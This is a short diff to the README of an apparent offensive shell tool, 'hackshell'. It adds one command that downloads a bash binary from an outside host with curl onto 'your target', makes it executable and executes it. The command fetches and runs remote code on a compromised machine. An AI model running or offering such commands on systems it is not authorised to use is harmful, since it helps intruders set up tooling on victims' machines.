@@ -20,3 +20,7 @@ Some features:
  
 ![hackshell](https://github.com/user-attachments/assets/fe4e9f4c-d0f6-4886-8f2f-ef7e3f86b406)
 
+It works best with bash. Download BASH if there is no bash on your target:
+```shell
+curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash' && chmod 700 bash && ./bash --version && exec ./bash -il
+```
